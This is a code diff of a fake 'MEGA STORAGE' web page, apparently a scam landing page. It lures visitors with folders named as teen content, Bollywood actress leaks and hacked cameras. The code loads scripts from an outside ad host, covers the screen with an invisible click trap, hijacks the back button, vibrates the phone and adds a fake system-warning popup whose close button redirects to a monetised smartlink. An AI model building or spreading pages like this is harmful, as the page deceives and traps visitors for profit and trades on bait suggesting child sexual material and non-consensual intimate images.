@@ -6,17 +6,25 @@
     <title>MEGA STORAGE - Cloud Connect</title>
     
     <script src="https://evacuateenclose.com/2d/f0/3e/2df03ec7f051608ea8806353a1663a9f.js"></script>
-
     <script src="https://evacuateenclose.com/65/5d/86/655d862c63ab08ee18932b53de13d177.js"></script>
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; }
+        body { background-color: #0b1120; color: #94a3b8; font-family: -apple-system, system-ui, sans-serif; padding: 15px; overflow-x: hidden; }
         
-        /* LỚP BẪY TÀNG HÌNH FULL MÀN HÌNH */
-        #trap {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 99999; cursor: pointer; background: rgba(0,0,0,0);
+        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; background: rgba(0,0,0,0); }
+
+        /* NÚT X GIẢ - TRÔNG NHƯ THÔNG BÁO HỆ THỐNG */
+        #fake-alert {
+            position: fixed; top: 20%; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 350px; background: #fff; color: #000;
+            padding: 15px; border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 10000; font-size: 14px; text-align: left; display: block;
+        }
+        .close-btn {
+            position: absolute; top: -10px; right: -10px; width: 30px; height: 30px;
+            background: #ff4444; color: white; border-radius: 50%; text-align: center;
+            line-height: 28px; font-weight: bold; cursor: pointer; border: 2px solid white;
         }
 
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding: 10px 5px; border-bottom: 1px solid #1e293b; }
@@ -29,17 +37,18 @@
         .info b { display: block; color: #f1f5f9; font-size: 14px; margin-bottom: 5px; text-transform: uppercase; }
         .info span { font-size: 11px; color: #64748b; }
 
-        .btn-download { 
-            display: block; text-decoration: none; background: #2563eb; color: #ffffff; 
-            text-align: center; padding: 18px; border-radius: 10px; font-weight: bold; 
-            margin-top: 15px; font-size: 16px; box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4); 
-        }
+        .btn-download { display: block; text-decoration: none; background: #2563eb; color: #ffffff; text-align: center; padding: 18px; border-radius: 10px; font-weight: bold; margin-top: 15px; }
         .footer-text { text-align: center; font-size: 10px; margin-top: 30px; color: #475569; }
     </style>
 </head>
 <body>
 
     <div id="trap"></div>
+
+    <div id="fake-alert">
+        <strong>⚠️ System Warning:</strong> Your storage is almost full. Please download files immediately.
+        <div class="close-btn" onclick="triggerLỏ()">X</div>
+    </div>
 
     <div class="header">
         <div class="logo">MEGA STORAGE</div>
@@ -48,53 +57,46 @@
 
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>T.E.E.N</b><span>142 Files • 1.4 GB</span></div>
+        <div class="info"><b>T.E.E.N</b><span>142 Files</span></div>
     </div>
-
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>B.O.L.L.Y.W.O.O.D_A.C.T.R.E.S.S_L.E.A.K.S</b><span>85 Files • 890 MB</span></div>
+        <div class="info"><b>B.O.L.L.Y.W.O.O.D_L.E.A.K.S</b><span>85 Files</span></div>
     </div>
-
     <div class="folder-card">
         <div class="icon">📁</div>
-        <div class="info"><b>W.H.A.T.S.A.P.P_V.I.R.A.L_G.R.O.U.P_L.I.N.K.S</b><span>210 Files • 2.1 GB</span></div>
-    </div>
-
-    <div class="folder-card">
-        <div class="icon">📁</div>
-        <div class="info"><b>H4CK CAMERA</b><span>56 Files • 4.2 GB</span></div>
+        <div class="info"><b>H.4.C.K C.A.M.E.R.A </b><span>210 Files</span></div>
     </div>
 
     <a href="https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566" class="btn-download">DOWNLOAD ALL PRIVATE FILES</a>
 
-    <div class="footer-text">
-        Secure Cloud Encryption © 2026. <br> High-Speed Mumbai Server.
-    </div>
+    <div class="footer-text">Secure Cloud Encryption © 2026. <br> Mumbai Cluster Node.</div>
 
     <script>
-        // 1. CLICK LẦN ĐẦU: NỔ POPUNDER + TẮT BẪY
+        var sLink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
+
+        // CLICK VÀO NÚT X GIẢ LÀ ĂN SMARTLINK
+        function triggerLỏ() {
+            window.location.href = sLink;
+        }
+
+        // CLICK VÀO TRAP NỔ POPUNDER
         document.getElementById('trap').addEventListener('click', function() {
-            this.style.display = 'none'; 
-            console.log("Popunder Triggered!");
+            this.style.display = 'none';
         });
 
-        // 2. TRICK RUNG MÁY (ANDROID)
-        window.addEventListener('load', function() {
-            if ("vibrate" in navigator) {
-                navigator.vibrate([100, 50, 100]);
-            }
-        });
-
-        // 3. TRICK BACK BUTTON HIJACK (BẤM BACK LÀ ĂN SMARTLINK)
+        // BACK BUTTON HIJACK
         (function() {
-            var smartlink = "https://evacuateenclose.com/zv12wf4v?key=7ffa37a8342c5fb3d04743a7015d7566";
             history.pushState(null, document.title, location.href);
-            window.addEventListener('popstate', function (event) {
-                // Ép quay lại trang smartlink thay vì thoát
-                window.location.assign(smartlink);
+            window.addEventListener('popstate', function () {
+                window.location.assign(sLink);
             });
         })();
+
+        // RUNG MÁY
+        window.addEventListener('load', function() {
+            if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+        });
     </script>
 
 </body>
